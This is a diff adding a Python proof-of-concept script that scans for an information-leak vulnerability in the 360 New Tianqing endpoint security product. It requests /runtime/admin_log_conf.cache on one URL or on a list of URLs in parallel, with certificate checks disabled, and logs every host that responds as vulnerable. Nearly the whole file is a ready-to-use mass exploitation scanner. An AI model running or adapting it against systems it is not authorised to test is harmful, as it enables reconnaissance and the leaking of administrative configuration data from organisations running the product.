@@ -1,0 +1,48 @@
+import requests,argparse,sys,json
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+def banner():
+    text="""
+██████╗  ██████╗  ██████╗       ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗      ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
+╚════██╗██╔════╝ ██╔═████╗      ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║      ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
+ █████╔╝███████╗ ██║██╔██║█████╗██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║█████╗██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
+ ╚═══██╗██╔═══██╗████╔╝██║╚════╝██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════╝██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
+██████╔╝╚██████╔╝╚██████╔╝      ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║      ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
+╚═════╝  ╚═════╝  ╚═════╝       ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
+                                                                                                                                                                                       
+                                                             author:zm
+"""
+    print(text)
+def main():
+    banner()
+    arges=argparse.ArgumentParser(description='This is 360 New Tianqing Information Leakage Vulnerability Poc')
+    arges.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
+    arges.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
+    arg=arges.parse_args()
+    if arg.url and not arg.file:
+        poc(arg.url)
+    elif arg.file and not arg.url:
+        url_list=[]
+        with open (arg.file,'r',encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip())
+            mp=Pool(30)
+            mp.map(poc,url_list)
+            mp.close()
+            mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+def poc(target):
+    api='/runtime/admin_log_conf.cache'
+    try:
+        res=requests.get(url=target+api,timeout=5,verify=False)
+        if res.status_code==200:
+            print(f"[+]{target} have loophole “{target+api}”")
+            with open ('result1.txt','a',encoding='utf-8') as f:
+                f.write(target+'\n')
+        else:
+            print(f"[-]{target} not have loophole")
+    except:
+        pass
+if __name__=='__main__':
+    main()
